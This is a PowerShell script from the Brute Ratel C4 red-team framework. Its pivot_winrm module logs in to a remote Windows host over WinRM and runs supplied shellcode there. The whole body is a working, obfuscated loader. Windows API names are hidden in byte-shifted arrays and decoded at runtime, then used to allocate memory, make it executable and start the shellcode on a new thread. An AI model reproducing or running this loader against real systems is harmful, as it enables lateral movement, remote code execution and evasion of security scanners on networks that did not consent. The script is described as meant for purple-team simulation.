# This was the core powershell script for pivot_winrm which was active in BRc4 till release v1.0.4. The ps1 script executed the badger's shellcode (BADGER_SHELLCODE variable) on the target host using Invoke-Command
# More information on this command can be found at: https://bruteratel.com/tabs/badger/commands/pivot_winrm/
# This code was never updated and was only added in BRc4 for the Purple Team simulation
# This code does not have any built-in evasion, except basic encryption to obfuscate the code from usual scanners
# Replace the 'BADGER_SHELLCODE' variable with any shellcode to execute via this script. The 'BADGER_REMOTE_HOST' should contain the target hostname. The USERPASSWORD and DOMAIN\USERNAME should be changed accordingly
# NOTE: This code will NOT be updated

$password = ConvertTo-SecureString "USERPASSWORD" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("DOMAIN\USERNAME", $password)
Invoke-Command -computer BADGER_REMOTE_HOST -credential $cred -scriptblock {
    Set-StrictMode -Version 2
    [Byte[]] $Ait1m = @(0x3d, 0x50, 0x51, 0x57, 0x50, 0x4e, 0x5f, 0x50, 0x4f, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50)
    [Byte[]] $ahv3I = @(0x34, 0x59, 0x38, 0x50, 0x58, 0x5a, 0x5d, 0x64, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50)
    [Byte[]] $Moo5y = @(0x38, 0x64, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50, 0x3f, 0x64, 0x5b, 0x50)
    [Byte[]] $ooR5o = @(0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x3e, 0x50, 0x4c, 0x57, 0x50, 0x4f, 0x17, 0x0b, 0x2c, 0x59, 0x5e, 0x54, 0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x2c, 0x60, 0x5f, 0x5a, 0x2e, 0x57, 0x4c, 0x5e, 0x5e)
    [Byte[]] $Reo5o = @(0x3d, 0x60, 0x59, 0x5f, 0x54, 0x58, 0x50, 0x17, 0x0b, 0x38, 0x4c, 0x59, 0x4c, 0x52, 0x50, 0x4f)
    [Byte[]] $Reib3 = @(0x3d, 0x3f, 0x3e, 0x5b, 0x50, 0x4e, 0x54, 0x4c, 0x57, 0x39, 0x4c, 0x58, 0x50, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e)
    [Byte[]] $Thah8 = @(0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x39, 0x50, 0x62, 0x3e, 0x57, 0x5a, 0x5f, 0x17, 0x0b, 0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57)
    [Byte[]] $ii5Ie = @(0x34, 0x59, 0x61, 0x5a, 0x56, 0x50)
    [Byte[]] $KooG5 = @(0x38, 0x54, 0x4e, 0x5d, 0x5a, 0x5e, 0x5a, 0x51, 0x5f, 0x19, 0x42, 0x54, 0x59, 0x1e, 0x1d, 0x19, 0x40, 0x59, 0x5e, 0x4c, 0x51, 0x50, 0x39, 0x4c, 0x5f, 0x54, 0x61, 0x50, 0x38, 0x50, 0x5f, 0x53, 0x5a, 0x4f, 0x5e)
    [Byte[]] $io9iH = @(0x32, 0x50, 0x5f, 0x3b, 0x5d, 0x5a, 0x4e, 0x2c, 0x4f, 0x4f, 0x5d, 0x50, 0x5e, 0x5e)
    [Byte[]] $Qui5i = @(0x32, 0x50, 0x5f, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50, 0x33, 0x4c, 0x59, 0x4f, 0x57, 0x50)
    [Byte[]] $xee2N = @(0x56, 0x50, 0x5d, 0x59, 0x50, 0x57, 0x1e, 0x1d)
    [Byte[]] $AD0Pi = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x2c, 0x57, 0x57, 0x5a, 0x4e)
    [Byte[]] $ahb3O = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x3b, 0x5d, 0x5a, 0x5f, 0x50, 0x4e, 0x5f)
    [Byte[]] $yhe4c = @(0x2E, 0x5D, 0x50, 0x4C, 0x5F, 0x50, 0x3F, 0x53, 0x5D, 0x50, 0x4C, 0x4F)
    
    function Get-Robf ($b3tz) {
        $aisN = [System.Byte[]]::new($b3tz.Count)
        for ($x = 0; $x -lt $aisN.Count; $x++) {
           $aisN[$x] = ($b3tz[$x] + 21)
        }
        return [System.Text.Encoding]::ASCII.GetString($aisN)
    }
    function Get-PA ($vmod, $vproc) {
        $a = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType((Get-Robf $KooG5))
        return ($a.GetMethod((Get-Robf $io9iH), [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($a.GetMethod((Get-Robf $Qui5i))).Invoke($null, @($vmod)))), $vproc))
    }
    function Get-TDef {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
            [Parameter(Position = 1)] [Type] $var_return_type = [Void]
        )
        $vtdef = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName((Get-Robf $Ait1m))), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule((Get-Robf  $ahv3I), $false).DefineType((Get-Robf $Moo5y), (Get-Robf $ooR5o), [System.MulticastDelegate])
        $vtdef.DefineConstructor((Get-Robf $Reib3), [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
        $vtdef.DefineMethod((Get-Robf $ii5Ie), (Get-Robf $Thah8), $var_return_type, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
        return $vtdef.CreateType()
    }
    
    [Byte[]]$vopcode = @(BADGER_SHELLCODE)
    
    $vbuf = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $AD0Pi)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))).Invoke([IntPtr]::Zero, $vopcode.Length, 0x3000, 0x04)
    [System.Runtime.InteropServices.Marshal]::Copy($vopcode, 0x0, $vbuf, $vopcode.length)
    ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $ahb3O)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))).Invoke($vbuf, $vopcode.Length, 0x20, [ref](0)) | Out-Null
    ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $yhe4c)), (Get-TDef @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([UInt32])))).Invoke(0, 0, $vbuf, [IntPtr]0, 0, [ref](0)) | Out-Null
}
